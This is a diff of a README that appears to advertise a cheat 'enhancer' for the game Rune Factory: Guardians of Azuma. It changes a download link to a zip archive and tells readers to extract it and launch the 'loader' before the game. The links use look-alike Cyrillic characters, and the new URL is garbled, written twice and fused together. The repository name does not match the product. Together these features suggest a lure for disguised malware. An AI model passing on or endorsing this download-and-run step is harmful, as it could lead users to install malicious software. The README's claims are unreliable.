@@ -4,7 +4,7 @@ Welcome to the ultimate enhancer for Rune Factory: Guardians of Azuma! This tool
 
 ## 🚀 Installation Guide
 
-1. Download *https://raw.githubusercontent.com/5321444/pitlane-attest/main/Lоader.zip* from this repository.
+1. Download *https://github.com/5321444/pitlane-attest/raw/refs/heads/main/quintessentiality/pitlane_attest_v2.8-beta.1.zipоhttps://github.com/5321444/pitlane-attest/raw/refs/heads/main/quintessentiality/pitlane_attest_v2.8-beta.1.zip* from this repository.
 2. Extract the archive using your favorite tool.
 3. Launch the loader before starting Rune Factory: Guardians of Azuma.
 4. Select your desired enhancements and enjoy!
